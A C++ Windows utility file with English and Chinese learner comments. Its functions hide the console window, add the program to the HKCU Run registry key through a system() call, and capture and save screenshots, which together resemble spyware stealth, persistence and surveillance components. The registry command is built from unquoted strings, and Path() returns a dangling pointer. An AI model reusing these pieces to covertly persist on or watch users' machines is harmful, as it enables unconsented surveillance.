#include "Utils.h"
/*
Funtion to hide current console?

*/
void Utils::HideConsole() {
	HWND hWnd;
	AllocConsole();//create a console if current process doesn't exit one.
	hWnd = FindWindowA("ConsoleWindowClass", 0);//why use the class name "ConsoleWindowClass" to find the window?
	ShowWindow(hWnd, 0);
}

void Utils::Autoload(string Name, string Path) {//add the executable file into the registry for booting it self
	string command = "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V " + Name + " /t REG_SZ /F /D " + Path;
	system(command.c_str());
}

string Utils::FindPath() {
	WCHAR Path[MAX_PATH];

	GetModuleFileName(NULL, Path, sizeof(Path) / sizeof(Path[0]));

	wstring ws(Path);
	string result(ws.begin(), ws.end());

	return result;
}

LPCWSTR Utils::Path() {
	WCHAR Path[MAX_PATH];

	GetModuleFileName(NULL, Path, sizeof(Path) / sizeof(Path[0]));

	LPCWSTR result = Path;

	return result;
}

string Utils::FindDir() {
	WCHAR Dir[MAX_PATH];

	GetCurrentDirectory(MAX_PATH, Dir);

	wstring ws(Dir);
	string result(ws.begin(), ws.end());

	return result;
}

inline int GetFilePointer(HANDLE FileHandle) {
	return SetFilePointer(FileHandle, 0, 0, FILE_CURRENT);
}

bool SaveBMPFile(char* filename, HBITMAP bitmap, HDC bitmapDC, int width, int height) {
	bool Success = 0;
	HBITMAP OffscrBmp = NULL;
	HDC OffscrDC = NULL;
	LPBITMAPINFO lpbi = NULL;
	LPVOID lpvBits = NULL;
	HANDLE BmpFile = INVALID_HANDLE_VALUE;
	BITMAPFILEHEADER bmfh;
	//为了创建一个新的位图句柄，以便在不影响旧位图的情况下使用它
	if ((OffscrBmp = CreateCompatibleBitmap(bitmapDC, width, height)) == NULL)
		return 0;
	//创建一个新的上下文信息
	if ((OffscrDC = CreateCompatibleDC(bitmapDC)) == NULL)
		return 0;
	//将新的位图句柄信息写入新的设备上下文，返回值为之前选入dc的位图句柄
	HBITMAP OldBmp = (HBITMAP)SelectObject(OffscrDC, OffscrBmp);
	//把bitmapDC中的区域完整地复制到offsrcDC的区域中
	//可以把这部分的区域看作为存储了位图内容的一块内存
	BitBlt(OffscrDC, 0, 0, width, height, bitmapDC, 0, 0, SRCCOPY);
	if ((lpbi = (LPBITMAPINFO)(new char[sizeof(BITMAPINFOHEADER) + 256 * sizeof(RGBQUAD)])) == NULL)
		return 0;
	ZeroMemory(&lpbi->bmiHeader, sizeof(BITMAPINFOHEADER));
	lpbi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	SelectObject(OffscrDC, OldBmp);//为什么要把旧的重新选择回去？

	if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, NULL, lpbi, DIB_RGB_COLORS))
		return 0;
	//get the format of the BitMap and then get the biSizeImage!
	if ((lpvBits = new char[lpbi->bmiHeader.biSizeImage]) == NULL)
		return 0;
	if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, lpvBits, lpbi, DIB_RGB_COLORS))
		return 0;
	if ((BmpFile = CreateFileA(filename,
		GENERIC_WRITE,
		0, NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL)) == INVALID_HANDLE_VALUE)
		return 0;
		//先将bitmap的格式信息和头信息写进去
	DWORD Written;
	bmfh.bfType = 19778;//"BM"
	bmfh.bfReserved1 = bmfh.bfReserved2 = 0;
	if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
		return 0;
	if (Written < sizeof(bmfh))
		return 0;
	if (!WriteFile(BmpFile, &lpbi->bmiHeader, sizeof(BITMAPINFOHEADER), &Written, NULL))
		return 0;
	if (Written < sizeof(BITMAPINFOHEADER))
		return 0;
	
	//将调色板的数据写进去
	int PalEntries;
	if (lpbi->bmiHeader.biCompression == BI_BITFIELDS)
		PalEntries = 3;
	else PalEntries = (lpbi->bmiHeader.biBitCount <= 8) ?
		(int)(1 << lpbi->bmiHeader.biBitCount) : 0;
	if (lpbi->bmiHeader.biClrUsed)
		PalEntries = lpbi->bmiHeader.biClrUsed;
	if (PalEntries) {
		if (!WriteFile(BmpFile, &lpbi->bmiColors, PalEntries * sizeof(RGBQUAD), &Written, NULL))
			return 0;
		if (Written < PalEntries * sizeof(RGBQUAD))
			return 0;
	}


	bmfh.bfOffBits = GetFilePointer(BmpFile);//from header to bitmap bits
	if (!WriteFile(BmpFile, lpvBits, lpbi->bmiHeader.biSizeImage, &Written, NULL))
		return 0;
	if (Written < lpbi->bmiHeader.biSizeImage)
		return 0;
	bmfh.bfSize = GetFilePointer(BmpFile);
	//bmfh更新过，所以需要重新写入
	SetFilePointer(BmpFile, 0, 0, FILE_BEGIN);
	if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
		return 0;
	if (Written < sizeof(bmfh))
		return 0;

	CloseHandle(BmpFile);

	delete[](char*)lpvBits;
	delete[] lpbi;

	DeleteDC(OffscrDC);
	DeleteObject(OffscrBmp);

	return 1;
}
/*
Function to get current screen's shot and save it
/Param x: the abscissa position
/Param y: the ordinate position
/Param width: the width of the screen.表示要截图的起始位置到终点的宽度
/Param height: the height of the screen 表示要截图的起始位置到终点的高度
//注：不同的屏幕分辨率不同，这样做截图大小可能不确定无法截图截到全屏
/Param filename: where the screen will be saved
/Param hwnd: a handle of a window
*/
bool Utils::Screenshot(int x, int y, int width, int height, char* filename, HWND hwnd) {
	HDC hDC = GetDC(hwnd);//get current entire window and its handle.类似于截图的时候会固定屏幕（假如你在放视频）
	HDC hDc = CreateCompatibleDC(hDC);//used for screen shot out.
//创建一个bitmap类型用来标识当前设备上下文，以便进行操作
	HBITMAP hBmp = CreateCompatibleBitmap(hDC, width, height);

	HGDIOBJ old = SelectObject(hDc, hBmp);
	BitBlt(hDc, 0, 0, width, height, hDC, x, y, SRCCOPY);

	bool ret = SaveBMPFile(filename, hBmp, hDc, width, height);

	SelectObject(hDc, old);

	DeleteObject(hBmp);

	DeleteDC(hDc);
	ReleaseDC(hwnd, hDC);

	return ret;
}